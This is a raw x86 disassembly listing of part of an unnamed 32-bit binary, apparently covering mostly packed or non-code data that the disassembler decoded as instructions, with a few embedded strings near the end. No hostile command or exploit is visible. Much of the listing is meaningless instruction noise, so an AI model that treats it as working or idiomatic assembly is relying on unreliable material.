  41f955:	mul    bh
  41f957:	add    edi,0xffffffd8
  41f95a:	out    0x4c,al
  41f95c:	stc    
  41f95d:	jge    0x41f95c
  41f95f:	jno    0x41f98e
  41f961:	shl    DWORD PTR [esi+0x4a0de320],cl
  41f967:	ins    BYTE PTR es:[edi],dx
  41f968:	inc    eax
  41f969:	imul   edx,eax,0x2ed16376
  41f96f:	fdivp  st(0),st
  41f971:	fmul   DWORD PTR [edx]
  41f973:	imul   ecx,DWORD PTR ds:0x9bcc0a0b,0xfe64fea5
  41f97d:	jecxz  0x41f99d
  41f97f:	int    0x4
  41f981:	cwde   
  41f982:	inc    ebx
  41f983:	aam    0xb4
  41f985:	shr    BYTE PTR [esi],1
  41f987:	mov    eax,0xdc6d1b75
  41f98c:	sub    edx,DWORD PTR [ebp+0x6b]
  41f98f:	adc    al,0x7a
  41f991:	push   ecx
  41f992:	add    eax,0xca5af776
  41f997:	pop    ecx
  41f998:	cs mul edx
  41f99b:	sub    esi,DWORD PTR [eax]
  41f99d:	mov    eax,0x1c5d3360
  41f9a2:	pushf  
  41f9a3:	inc    edx
  41f9a4:	dec    BYTE PTR [edi+0x1dd5a5a6]
  41f9aa:	xchg   edi,eax
  41f9ab:	dec    eax
  41f9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ad:	test   ch,al
  41f9af:	cdq    
  41f9b0:	ins    BYTE PTR es:[edi],dx
	...
  41f9b9:	add    BYTE PTR [eax],al
  41f9bb:	xchg   ebx,eax
  41f9bc:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f9c3:	push   eax
  41f9c4:	loopne 0x41f9c0
  41f9c6:	call   0xa6fd:0xf031935
  41f9cd:	add    DWORD PTR [eax],eax
  41f9cf:	scas   al,BYTE PTR es:[edi]
  41f9d0:	add    BYTE PTR [eax],al
  41f9d2:	add    ch,ch
  41f9d4:	dec    ecx
  41f9d5:	xchg   DWORD PTR [ebx-0x65bc32b6],ebx
  41f9db:	mov    al,0xfa
  41f9dd:	jmp    0xbb30466b
  41f9e2:	xchg   esp,eax
  41f9e3:	xchg   ebp,eax
  41f9e4:	data16 jns 0x41fa2e
  41f9e7:	lds    ebp,FWORD PTR [ebx-0x4e]
  41f9ea:	cmc    
  41f9eb:	dec    ebx
  41f9ec:	mov    edi,ds
  41f9ee:	mov    al,ah
  41f9f0:	cmp    eax,DWORD PTR [esi]
  41f9f2:	int3   
  41f9f3:	aaa    
  41f9f4:	(bad)  [ecx+esi*4+0x2eef2a2c]
  41f9fb:	jle    0x41fa5e
  41f9fd:	inc    ecx
  41f9fe:	sub    dh,dl
  41fa00:	jg     0x41f9cd
  41fa02:	jl     0x41f9f7
  41fa04:	push   eax
  41fa05:	(bad)  
  41fa07:	call   0x360e19c2
  41fa0c:	into   
  41fa0d:	sub    BYTE PTR [esi],dl
  41fa0f:	js     0x41fa7c
  41fa11:	fnstsw WORD PTR [eax+ecx*8+0x26a65e42]
  41fa18:	pushf  
  41fa19:	push   0x8c63a7a8
  41fa1e:	sti    
  41fa1f:	xor    al,0x29
  41fa21:	ins    DWORD PTR es:[edi],dx
  41fa22:	cmp    al,0x80
  41fa24:	mov    esp,0xdd4cc143
  41fa29:	mov    DWORD PTR [ebx],edx
  41fa2b:	dec    ecx
  41fa2c:	cmc    
  41fa2d:	das    
  41fa2e:	je     0x41f9f2
  41fa30:	inc    ebx
  41fa31:	outs   dx,DWORD PTR gs:[esi]
  41fa33:	adc    al,0xb
  41fa35:	int    0xa
  41fa37:	mov    bl,0x27
  41fa39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa3a:	sub    al,0x69
  41fa3c:	xor    DWORD PTR [ebx+edx*1+0x755b0668],ecx
  41fa43:	push   esi
  41fa44:	cs pop ecx
  41fa46:	(bad)  
  41fa47:	test   eax,0xcd0f1e02
  41fa4c:	jg     0x41fa09
  41fa4e:	push   edx
  41fa4f:	rcl    BYTE PTR [ebx],0xa0
  41fa52:	sbb    DWORD PTR ds:0xa861f0d9,edi
  41fa58:	mov    bh,0xab
  41fa5a:	rol    DWORD PTR [ebp+0x64cb95a2],1
  41fa60:	adc    eax,0x95be13de
  41fa65:	ins    BYTE PTR es:[edi],dx
  41fa66:	xor    al,BYTE PTR [edx+0x2d]
  41fa69:	xchg   ebx,eax
  41fa6a:	jmp    0x58073d78
  41fa6f:	mov    ebx,0x6092448
  41fa74:	mov    bl,0x73
  41fa76:	(bad)  
  41fa77:	leave  
  41fa78:	xor    edx,DWORD PTR [ecx+0x36]
  41fa7b:	mov    DWORD PTR [edi+0x5dcba170],0x0
  41fa85:	add    BYTE PTR [eax],al
  41fa87:	add    BYTE PTR [eax],al
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	(bad)  
  41fa8d:	test   eax,0xddffeef7
  41fa93:	and    al,0x1
  41fa95:	pop    ebp
  41fa96:	dec    edi
  41fa97:	pop    ebx
  41fa98:	or     al,0x33
  41fa9a:	pop    esp
  41fa9b:	stos   DWORD PTR es:[edi],eax
  41fa9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa9d:	add    DWORD PTR [eax],eax
  41fa9f:	scas   al,BYTE PTR es:[edi]
  41faa0:	add    BYTE PTR [eax],al
  41faa2:	add    BYTE PTR ds:0x99ddc09,dl
  41faa8:	shl    DWORD PTR [eax-0x20],0x9f
  41faac:	cld    
  41faad:	cmp    DWORD PTR [ecx-0x30],esp
  41fab0:	dec    edx
  41fab1:	cs stos BYTE PTR es:[edi],al
  41fab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab4:	fdiv   DWORD PTR [edi*8+0x5c3bb8ea]
  41fabb:	mov    edi,0xd7595ef0
  41fac0:	cwde   
  41fac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fac2:	jo     0x41fad4
  41fac4:	(bad)  
  41fac5:	bound  edi,QWORD PTR [edx+0x1ce84c11]
  41facb:	aaa    
  41facc:	mov    dh,0x65
  41face:	shr    BYTE PTR [esi],1
  41fad0:	in     al,dx
  41fad1:	jae    0x41faea
  41fad3:	pop    esp
  41fad4:	jle    0x41fafb
  41fad6:	leave  
  41fad7:	sahf   
  41fad8:	in     eax,0x1f
  41fada:	sub    al,0x2e
  41fadc:	mov    ch,0xeb
  41fade:	jno    0x41fa60
  41fae0:	cmp    edi,DWORD PTR [edi]
  41fae2:	inc    edx
  41fae3:	mov    ecx,0x18f4f277
  41fae8:	imul   edx,DWORD PTR [eax],0xffffffea
  41faeb:	xchg   BYTE PTR [edi+0x26],al
  41faee:	xor    eax,DWORD PTR [ebx-0x7d509adb]
  41faf4:	add    eax,0xca6c71fc
  41faf9:	mov    WORD PTR [ebx],cs
  41fafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fafc:	xor    DWORD PTR ds:0xf451f060,esi
  41fb02:	loope  0x41facb
  41fb04:	xchg   esi,eax
  41fb05:	inc    ebp
  41fb06:	xor    esi,0xa
  41fb09:	xlat   BYTE PTR ds:[ebx]
  41fb0a:	(bad)  [edi-0x46]
  41fb0d:	xor    eax,0xa04a8f77
  41fb12:	repz push edi
  41fb14:	cmp    esp,eax
  41fb16:	mov    ebp,0x490524c
  41fb1b:	mov    bl,0x59
  41fb1d:	dec    esp
  41fb1e:	push   ebp
  41fb1f:	or     DWORD PTR [esi+0x635fa63],esi
  41fb25:	ret    0xb4b
  41fb28:	and    al,0x43
  41fb2a:	nop
  41fb2b:	mov    bh,al
  41fb2d:	cmp    DWORD PTR [ebx+0x29],esi
  41fb30:	push   0x7858dcd3
  41fb35:	push   ecx
  41fb36:	xor    BYTE PTR [ebx+0x73],al
  41fb39:	(bad)  
  41fb3a:	jl     0x41faec
  41fb3c:	ss aad 0xef
  41fb3f:	call   0xdb35:0xaad9752c
  41fb46:	test   al,0x71
  41fb48:	dec    edi
  41fb49:	lods   eax,DWORD PTR ds:[esi]
  41fb4a:	mov    esi,0xc8952c1
  41fb4f:	or     eax,0x56
  41fb54:	add    BYTE PTR [eax],al
  41fb56:	add    BYTE PTR [eax],al
  41fb58:	add    BYTE PTR [eax],al
  41fb5a:	add    BYTE PTR [edi-0x5e],ch
  41fb5d:	aam    0x2a
  41fb5f:	fnstsw WORD PTR [esi-0x1]
  41fb62:	out    0x52,eax
  41fb64:	fcmovu st,st(5)
  41fb66:	in     eax,0x4e
  41fb68:	fs das 
  41fb6a:	(bad)  
  41fb6b:	pop    ecx
  41fb6c:	test   al,0x1
  41fb6e:	add    BYTE PTR [esi-0x58000000],ch
  41fb74:	loopne 0x41fb87
  41fb76:	sub    eax,0x4aab152
  41fb7b:	in     eax,0x14
  41fb7d:	push   ebx
  41fb7e:	(bad)  
  41fb7f:	arpl   WORD PTR [esi],si
  41fb81:	mov    cl,0xed
  41fb83:	rcl    DWORD PTR ds:0xfc45beed,cl
  41fb89:	dec    ebp
  41fb8a:	jg     0x41fbb8
  41fb8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb8d:	pushf  
  41fb8e:	dec    edi
  41fb8f:	sbb    BYTE PTR [esi+ebx*2],bh
  41fb92:	mov    BYTE PTR [ebx+0x28227204],dh
  41fb98:	pop    ebx
  41fb99:	jb     0x41fbdf
  41fb9b:	inc    eax
  41fb9c:	repz cmc 
  41fb9e:	mov    edi,0xfa3a8c44
  41fba3:	(bad)  
  41fba4:	call   0x1af301ed
  41fba9:	push   edi
  41fbaa:	out    0x52,eax
  41fbac:	add    al,0x91
  41fbae:	mov    ds:0x58f4425e,al
  41fbb3:	mov    ecx,0x78fb2dbf
  41fbb8:	clc    
  41fbb9:	cmp    ebp,ecx
  41fbbb:	jnp    0x41fb47
  41fbbd:	imul   edx,eax,0x1b
  41fbc0:	loop   0x41fc40
  41fbc2:	xor    DWORD PTR [ebp-0x7f],edi
  41fbc5:	jecxz  0x41fbf0
  41fbc7:	lods   eax,DWORD PTR ds:[esi]
  41fbc8:	shl    ch,0x30
  41fbcb:	in     al,dx
  41fbcc:	dec    ecx
  41fbcd:	loope  0x41fc16
  41fbcf:	jno    0x41fbbb
  41fbd1:	sub    edx,ebp
  41fbd3:	mov    fs,esi
  41fbd5:	xchg   ecx,eax
  41fbd6:	and    al,0x2b
  41fbd8:	enter  0xc19f,0x49
  41fbdc:	sbb    eax,0x5f1f8576
  41fbe1:	aam    0x7d
  41fbe3:	xor    al,0x11
  41fbe5:	cmp    al,0x78
  41fbe7:	enter  0xeb4d,0xa4
  41fbeb:	push   cs
  41fbec:	push   ss
  41fbed:	cmp    ecx,DWORD PTR [edx+0x3cfbe54]
  41fbf3:	sbb    dl,dl
  41fbf5:	aas    
  41fbf6:	sbb    dl,al
  41fbf8:	pop    ebx
  41fbf9:	inc    ebp
  41fbfa:	div    ebx
  41fbfc:	or     eax,0xdf4eb70f
  41fc01:	fadd   DWORD PTR [esi+0x2e]
  41fc04:	push   edx
  41fc05:	mov    al,0x5f
  41fc07:	std    
  41fc08:	aad    0x3b
  41fc0a:	popf   
  41fc0b:	cld    
  41fc0c:	and    dl,BYTE PTR [ecx+ebp*2-0x80]
  41fc10:	jg     0x41fb99
  41fc12:	adc    eax,0xdd4df7c0
  41fc17:	pushf  
  41fc18:	mov    edx,0x1f4c149f
  41fc1d:	sub    eax,0xe70a52
	...
  41fc2a:	add    cl,bh
  41fc2c:	sbb    al,al
  41fc2e:	inc    esi
  41fc2f:	jecxz  0x41fc0f
  41fc31:	(bad)  
  41fc32:	mov    edi,0xe1f1bc83
  41fc37:	cli    
  41fc38:	loop   0x41fbdc
  41fc3a:	pop    ds
  41fc3b:	pop    es
  41fc3c:	test   eax,0xae0001
  41fc41:	add    BYTE PTR [eax],al
  41fc43:	xor    al,0x6d
  41fc45:	fist   DWORD PTR [ebp+0x1]
  41fc48:	dec    esi
  41fc49:	fs ja  0x41fbf1
  41fc4c:	mov    edi,0xc242655d
  41fc51:	inc    ebx
  41fc52:	fadd   QWORD PTR [edi+0x50]
  41fc55:	ins    BYTE PTR es:[edi],dx
  41fc56:	cmp    dh,BYTE PTR [eax]
  41fc58:	popf   
  41fc59:	test   al,0xb1
  41fc5b:	xchg   edi,eax
  41fc5c:	inc    edx
  41fc5d:	jb     0x41fc88
  41fc5f:	cdq    
  41fc60:	cmp    BYTE PTR [edx+0x797809d8],cl
  41fc66:	cmp    eax,0x2881dce3
  41fc6b:	(bad)  
  41fc6c:	fld    TBYTE PTR [ebx+ecx*2+0x2e]
  41fc70:	mov    al,0xff
  41fc72:	sbb    cl,ah
  41fc74:	dec    edi
  41fc75:	mov    esp,0x67cf969b
  41fc7a:	out    dx,al
  41fc7b:	loop   0x41fc09
  41fc7d:	cld    
  41fc7e:	std    
  41fc7f:	outs   dx,DWORD PTR ss:[esi]
  41fc81:	repz inc ecx
  41fc83:	icebp  
  41fc84:	jne    0x41fc47
  41fc86:	xchg   ebp,eax
  41fc87:	inc    ebx
  41fc88:	pop    esp
  41fc89:	inc    ecx
  41fc8a:	sub    dh,BYTE PTR [edi-0x479111cf]
  41fc90:	cmp    al,BYTE PTR [esi-0x544fe83]
  41fc96:	xor    edx,ebx
  41fc98:	or     esi,DWORD PTR ds:0xffa2339e
  41fc9e:	repz jmp 0x41fc27
  41fca1:	pop    edi
  41fca2:	xchg   ebx,eax
  41fca3:	imul   edi,ecx,0x16
  41fca6:	cmp    BYTE PTR [edi+edx*1],bl
  41fca9:	rol    DWORD PTR [eax+0x7cb2bf6],0x35
  41fcb0:	aad    0x7d
  41fcb2:	and    al,BYTE PTR [ebp-0x4e]
  41fcb5:	repnz and eax,0x14aa1463
  41fcbb:	push   ds
  41fcbc:	push   ebp
  41fcbd:	loop   0x41fcb4
  41fcbf:	mov    ds:0x339a20f3,eax
  41fcc4:	ror    DWORD PTR [ecx],1
  41fcc6:	sbb    BYTE PTR [edi+esi*1+0x1c],dl
  41fcca:	jbe    0x41fcd8
  41fccc:	shl    DWORD PTR [edx-0x59267687],0x81
  41fcd3:	ror    DWORD PTR [ebp+ebx*2+0x1c],cl
  41fcd7:	jo     0x41fc5e
  41fcd9:	jne    0x41fcc7
  41fcdb:	sub    DWORD PTR [edi-0x11],eax
  41fcde:	mov    dl,0xab
  41fce0:	inc    eax
  41fce1:	loop   0x41fc6c
  41fce3:	xor    cl,0x27
  41fce6:	mov    ds:0x89985fe8,eax
  41fceb:	pop    ds
  41fcec:	aam    0xb4
  41fcee:	mov    edx,0xacb3
	...
  41fcfb:	mov    eax,ds:0x3e8336b9
  41fd00:	(bad)  
  41fd01:	mov    ch,0xbb
  41fd03:	icebp  
  41fd04:	and    eax,0x42ec8c27
  41fd09:	data16 repnz mov ch,0xa9
  41fd0d:	add    DWORD PTR [eax],eax
  41fd0f:	scas   al,BYTE PTR es:[edi]
  41fd10:	add    BYTE PTR [eax],al
  41fd12:	add    dl,dl
  41fd14:	pushf  
  41fd15:	call   0xa6b0cad9
  41fd1a:	sbb    eax,0xe2223ee2
  41fd1f:	bound  ecx,QWORD PTR [edi+0xf81f1a1]
  41fd25:	(bad)  
  41fd26:	mov    DWORD PTR [esi],ebx
  41fd28:	inc    edi
  41fd29:	sbb    bl,BYTE PTR [ecx-0x2e94e32e]
  41fd2f:	fs gs push dx
  41fd33:	and    dl,bh
  41fd35:	push   edx
  41fd36:	xor    ebx,DWORD PTR [eax-0x1b8e63d6]
  41fd3c:	jg     0x41fd37
  41fd3e:	cmc    
  41fd3f:	test   BYTE PTR [ecx-0x2f],bh
  41fd42:	and    al,ch
  41fd44:	pop    esp
  41fd45:	add    DWORD PTR [esi-0x7ffafd65],0x5d1542b0
  41fd4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd50:	lahf   
  41fd51:	in     eax,0x33
  41fd53:	scas   eax,DWORD PTR es:[edi]
  41fd54:	add    eax,0x3157d1b4
  41fd59:	shl    ebx,cl
  41fd5b:	jbe    0xccce7c2d
  41fd61:	in     eax,0x59
  41fd63:	dec    esp
  41fd64:	sti    
  41fd65:	int    0x97
  41fd67:	xor    DWORD PTR [ebx+edx*8+0x2c8db512],ebx
  41fd6e:	in     al,0xc7
  41fd70:	xchg   DWORD PTR [ecx],eax
  41fd72:	and    DWORD PTR [edx-0x28],ebx
  41fd75:	loopne 0x41fd97
  41fd77:	mov    dl,0x1f
  41fd79:	pop    esi
  41fd7a:	les    ecx,FWORD PTR [ebx]
  41fd7c:	das    
  41fd7d:	and    ecx,DWORD PTR [edx]
  41fd7f:	xor    eax,0xa497acab
  41fd84:	(bad)  
  41fd85:	push   eax
  41fd86:	jl     0x41fd70
  41fd88:	adc    dl,BYTE PTR [ecx-0x6be7fd33]
  41fd8e:	or     ecx,DWORD PTR [eax+0x18]
  41fd91:	retf   
  41fd92:	xor    esi,edi
  41fd94:	jns    0x41fd48
  41fd96:	lds    ebx,FWORD PTR [edx]
  41fd98:	add    al,0x37
  41fd9a:	xchg   ebp,eax
  41fd9b:	fucompp 
  41fd9d:	ds sub ebp,ebx
  41fda0:	lods   al,BYTE PTR ds:[esi]
  41fda1:	popa   
  41fda2:	mov    ebp,0xcb78dede
  41fda7:	xchg   ebp,eax
  41fda8:	xchg   ebx,eax
  41fda9:	add    esi,0x6a
  41fdac:	pop    ecx
  41fdad:	push   ebp
  41fdae:	clc    
  41fdaf:	fxch   st(5)
  41fdb1:	mov    al,0x69
  41fdb3:	mov    dl,0x4a
  41fdb5:	rcl    DWORD PTR ds:0x8730d9bb,1
  41fdbb:	cpuid  
  41fdbd:	inc    eax
  41fdbe:	in     eax,dx
  41fdbf:	rcr    edi,0x0
	...
  41fdca:	add    BYTE PTR [edx],dl
  41fdcc:	xlat   BYTE PTR ds:[ebx]
  41fdcd:	repz or esi,edi
  41fdd0:	das    
  41fdd1:	cli    
  41fdd2:	fist   WORD PTR [ecx]
  41fdd4:	dec    ebx
  41fdd5:	es nop
  41fdd7:	inc    esi
  41fdd8:	mov    ecx,0xaa6362fb
  41fddd:	add    DWORD PTR [eax],eax
  41fddf:	scas   al,BYTE PTR es:[edi]
  41fde0:	add    BYTE PTR [eax],al
  41fde2:	add    BYTE PTR [esi],dh
  41fde4:	dec    esi
  41fde5:	test   eax,0xed04c771
  41fdea:	cmc    
  41fdeb:	(bad)  
  41fdec:	sbb    DWORD PTR ss:[edx+0x3a3651bf],0x1734d810
  41fdf7:	cmp    dh,BYTE PTR ds:0xffaf56ad
  41fdfd:	bound  ebp,QWORD PTR [edx-0x20]
  41fe00:	dec    ecx
  41fe01:	sub    DWORD PTR [edi+0x7e],edx
  41fe04:	or     DWORD PTR [esi+edi*1-0x40],esp
  41fe08:	mov    ecx,0xd915981c
  41fe0d:	add    eax,0xf1e50d96
  41fe12:	xor    BYTE PTR [edi+0x6dc4c458],cl
  41fe18:	lods   eax,DWORD PTR ds:[esi]
  41fe19:	push   ss
  41fe1a:	mov    ecx,0xb887064d
  41fe1f:	push   ss
  41fe20:	inc    ecx
  41fe21:	jg     0x41fe9f
  41fe23:	push   ebx
  41fe24:	in     eax,dx
  41fe25:	fs dec ebx
  41fe27:	xchg   edi,edx
  41fe29:	lods   al,BYTE PTR ds:[esi]
  41fe2a:	sbb    BYTE PTR [esi-0x333928d0],ch
  41fe30:	repnz popf 
  41fe32:	xchg   DWORD PTR [esp+0x7b],ebx
  41fe36:	(bad)  
  41fe38:	fs test al,0x4e
  41fe3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe3c:	ins    DWORD PTR es:[edi],dx
  41fe3d:	icebp  
  41fe3e:	jb     0x41fe50
  41fe40:	test   dh,al
  41fe42:	cs pop ebp
  41fe44:	cmp    eax,0xec8e5871
  41fe49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4a:	ins    DWORD PTR es:[edi],dx
  41fe4b:	or     eax,0x3c03627
  41fe50:	sbb    eax,0x25d5939f
  41fe55:	jl     0x41feca
  41fe57:	sahf   
  41fe58:	and    eax,0x7fc1a292
  41fe5d:	dec    esp
  41fe5e:	inc    eax
  41fe5f:	mov    cl,0x76
  41fe61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe62:	mov    ecx,0x6a7a1300
  41fe67:	arpl   WORD PTR [ebx],di
  41fe69:	xchg   ecx,eax
  41fe6a:	sub    esp,DWORD PTR [edi]
  41fe6c:	mov    eax,0xf714bb82
  41fe71:	mov    esp,0x2ace6342
  41fe76:	lea    eax,[edi-0x12bb878a]
  41fe7c:	lahf   
  41fe7d:	loop   0x41fe36
  41fe7f:	stos   DWORD PTR es:[edi],eax
  41fe80:	sbb    DWORD PTR [ebp+0x3cc9b95],ecx
  41fe86:	mov    DWORD PTR [esi+0x12],edx
  41fe89:	ror    BYTE PTR [ebx+edi*2],cl
  41fe8c:	mov    ebx,0x1850f022
	...
  41fe99:	add    BYTE PTR [eax],al
  41fe9b:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41fea1:	inc    edx
  41fea2:	add    BYTE PTR [eax],cl
  41fea4:	nop
  41fea5:	inc    edx
  41fea6:	add    BYTE PTR [eax+edx*4],cl
  41fea9:	inc    edx
  41feaa:	add    BYTE PTR [eax],dl
  41feac:	nop
  41fead:	inc    edx
  41feae:	add    BYTE PTR [eax+edx*4],dl
  41feb1:	inc    edx
  41feb2:	add    BYTE PTR [eax],bl
  41feb4:	nop
  41feb5:	inc    edx
  41feb6:	add    BYTE PTR [eax+edx*4],bl
  41feb9:	inc    edx
  41feba:	add    BYTE PTR [esi+0x49],cl
  41febd:	dec    esi
  41febe:	pop    edi
  41febf:	pop    edx
  41fec0:	dec    edx
  41fec1:	inc    ecx
  41fec2:	xor    eax,DWORD PTR [eax]
  41fec4:	push   ebx
  41fec5:	push   edi
  41fec6:	inc    edi
  41fec7:	cmp    DWORD PTR [edi+0x41],ebx
  41feca:	pop    eax
  41fecb:	ss push esi
  41fecd:	pop    ecx
  41fece:	add    BYTE PTR [ebx+0x43],dl
  41fed1:	inc    ebp
  41fed2:	pop    edi
  41fed3:	inc    ecx
  41fed4:	pop    eax
  41fed5:	push   edi
  41fed6:	dec    eax
  41fed7:	inc    edx
  41fed8:	pop    edi
  41fed9:	cmp    DWORD PTR [ecx+0x4d],ecx
  41fedc:	dec    ecx
  41fedd:	add    BYTE PTR [ecx+0x46],al
  41fee0:	cmp    DWORD PTR [edx],esi
  41fee2:	xor    ebx,DWORD PTR [edi+0x32]
  41fee5:	aaa    
  41fee6:	inc    esp
  41fee7:	inc    esp
  41fee8:	pop    edi
  41fee9:	xor    eax,0x41545800
  41feee:	pop    edi
  41feef:	push   ecx
  41fef0:	push   esp
  41fef1:	inc    esi
  41fef2:	push   ebp
  41fef3:	cmp    DWORD PTR [eax],eax
  41fef5:	push   edi
  41fef6:	push   ebp
  41fef7:	inc    ecx
  41fef8:	xor    dh,BYTE PTR [ebx]
  41fefa:	xor    ebx,DWORD PTR [edi+0x4e]
  41fefd:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff01:	cmp    DWORD PTR [edi+0x38],ebx
  41ff04:	dec    ecx
  41ff05:	cmp    DWORD PTR [edx+0x36],ebx
  41ff08:	pop    edi
  41ff09:	dec    edx
  41ff0a:	xor    BYTE PTR [edx+0x34],cl
  41ff0d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff11:	xor    esi,DWORD PTR [eax]
  41ff13:	pop    edi
  41ff14:	inc    edx
  41ff15:	dec    ebx
  41ff16:	pop    eax
  41ff17:	pop    eax
  41ff18:	xor    eax,0x51414d00
  41ff1d:	pop    edi
  41ff1e:	inc    ecx
  41ff1f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff22:	inc    ecx
  41ff23:	dec    ebx
  41ff24:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff2a:	inc    ebp
  41ff2b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff2e:	ss dec eax
  41ff30:	dec    ebx
  41ff31:	add    BYTE PTR [ebp+0x57],al
  41ff34:	xor    DWORD PTR [edi+0x31],ebx
  41ff37:	dec    ebx
  41ff38:	xor    eax,DWORD PTR [ecx+0x30]
  41ff3b:	push   ebx
  41ff3c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff40:	aaa    
  41ff41:	pop    edi
  41ff42:	push   edx
  41ff43:	dec    eax
  41ff44:	dec    ebp
  41ff45:	cmp    BYTE PTR [edi+0x37],bl
  41ff48:	inc    esi
  41ff49:	xor    eax,0x35005500
  41ff4e:	add    BYTE PTR [ebx+0x0],al
  41ff51:	pop    edi
  41ff52:	add    BYTE PTR [ecx+0x0],bl
  41ff55:	dec    ecx
  41ff56:	add    BYTE PTR [ebx+0x0],dl
  41ff59:	xor    al,BYTE PTR [eax]
  41ff5b:	pop    edi
  41ff5c:	add    BYTE PTR [edx+0x0],dl
  41ff5f:	add    BYTE PTR [eax],al
  41ff61:	push   eax
  41ff62:	add    BYTE PTR [ebp+0x0],dl
  41ff65:	dec    ecx
  41ff66:	add    BYTE PTR [eax],dh
  41ff68:	add    BYTE PTR [edi+0x0],bl
  41ff6b:	inc    ebx
  41ff6c:	add    BYTE PTR [esi],dh
  41ff6e:	add    BYTE PTR [ebp+0x0],al
  41ff71:	xor    al,BYTE PTR [eax]
  41ff73:	pop    edi
  41ff74:	add    BYTE PTR [ebp+0x0],cl
  41ff77:	xor    al,0x0
  41ff79:	dec    edx
  41ff7a:	add    BYTE PTR [edx+0x0],dl
  41ff7d:	push   ebp
  41ff7e:	add    BYTE PTR [eax],al
  41ff80:	add    BYTE PTR [esi+0x0],cl
  41ff83:	cmp    DWORD PTR [eax],eax
  41ff85:	push   eax
  41ff86:	add    BYTE PTR [edi+0x0],bl
  41ff89:	push   ebp
  41ff8a:	add    BYTE PTR [ecx],bh
  41ff8c:	add    BYTE PTR [esi],dh
  41ff8e:	add    BYTE PTR [eax],dh
  41ff90:	add    BYTE PTR [ecx],dh
  41ff92:	add    BYTE PTR [edi+0x0],bl
  41ff95:	dec    edi
  41ff96:	add    BYTE PTR [esi+0x0],cl
  41ff99:	push   esp
  41ff9a:	add    BYTE PTR [eax],bh
  41ff9c:	add    BYTE PTR [eax],al
  41ff9e:	add    BYTE PTR [eax+eax*1+0x34],cl
  41ffa2:	add    BYTE PTR [eax+eax*1+0x31],al
  41ffa6:	add    BYTE PTR [edi+0x0],bl
  41ffa9:	dec    ebx
  41ffaa:	add    BYTE PTR [ecx],dh
  41ffac:	add    BYTE PTR [ebp+0x0],al
  41ffaf:	pop    edi
  41ffb0:	add    BYTE PTR [edx+0x0],bl
  41ffb3:	add    BYTE PTR [eax],al
  41ffb5:	push   esp
  41ffb6:	add    BYTE PTR [edi],dh
  41ffb8:	add    BYTE PTR [ebx+0x0],al
  41ffbb:	pop    edi
  41ffbc:	add    BYTE PTR [edx+0x0],al
  41ffbf:	xor    al,BYTE PTR [eax]
  41ffc1:	xor    DWORD PTR [eax],eax
  41ffc3:	push   ebx
  41ffc4:	add    BYTE PTR [ecx],dh
  41ffc6:	add    BYTE PTR [ecx],bh
  41ffc8:	add    BYTE PTR [edx+0x0],al
  41ffcb:	add    BYTE PTR [eax],al
  41ffcd:	inc    edi
  41ffce:	add    BYTE PTR [ebp+0x0],al
  41ffd1:	xor    al,0x0
  41ffd3:	cmp    BYTE PTR [eax],al
  41ffd5:	add    BYTE PTR [eax],al
  41ffd7:	add    BYTE PTR [eax+0x42],dl
  41ffda:	add    BYTE PTR [eax+edx*2],al
  41ffdd:	inc    edx
  41ffde:	add    BYTE PTR [eax],cl
  41ffe0:	push   eax
  41ffe1:	inc    edx
  41ffe2:	add    BYTE PTR [eax+edx*2],cl
  41ffe5:	inc    edx
  41ffe6:	add    BYTE PTR [eax],dl
  41ffe8:	push   eax
  41ffe9:	inc    edx
  41ffea:	add    BYTE PTR [eax+edx*2],dl
  41ffed:	inc    edx
  41ffee:	add    BYTE PTR [eax],bl
  41fff0:	push   eax
  41fff1:	inc    edx
  41fff2:	add    BYTE PTR [eax+edx*2],bl
  41fff5:	inc    edx
  41fff6:	add    BYTE PTR [eax],ah
  41fff8:	push   eax
  41fff9:	inc    edx
  41fffa:	add    BYTE PTR [eax+edx*2],ah
  41fffd:	inc    edx
  41fffe:	add    BYTE PTR [eax],ch
  420000:	push   eax
  420001:	inc    edx
	...
  420012:	add    BYTE PTR [eax],al
  420014:	call   0x0:0x4d3ef2
  42001b:	add    BYTE PTR [edx+0x0],al
  42001e:	add    al,BYTE PTR [eax]
  420020:	add    DWORD PTR [eax],eax
  420022:	add    BYTE PTR [eax],al
  420024:	add    DWORD PTR [eax],eax
  420026:	add    BYTE PTR [eax],al
  420028:	add    DWORD PTR [eax],eax
  42002a:	add    BYTE PTR [eax],al
  42002c:	cmp    BYTE PTR [eax],al
  42002e:	add    al,BYTE PTR [eax]
  420030:	cmp    al,0x0
  420032:	add    al,BYTE PTR [eax]
  420034:	inc    eax
  420035:	add    BYTE PTR [edx],al
  420037:	add    ah,bl
  420039:	cmp    al,0x0
  42003b:	add    BYTE PTR [esi+0x0],cl
  42003e:	add    al,BYTE PTR [eax]
  420040:	add    BYTE PTR [eax],al
  420042:	push   edi
  420043:	outs   dx,DWORD PTR ds:[esi]
  420044:	jb     0x4200aa
  420046:	push   edi
  420047:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42004e:	aas    
  42004f:	inc    ebx
  420050:	ins    BYTE PTR es:[edi],dx
  420051:	outs   dx,DWORD PTR ds:[esi]
  420052:	jae    0x4200b9
  420054:	push   edi
  420055:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42005c:	popa   
  42005d:	je     0x4200c8
  42005f:	outs   dx,DWORD PTR ds:[esi]
  420060:	outs   dx,BYTE PTR ds:[esi]
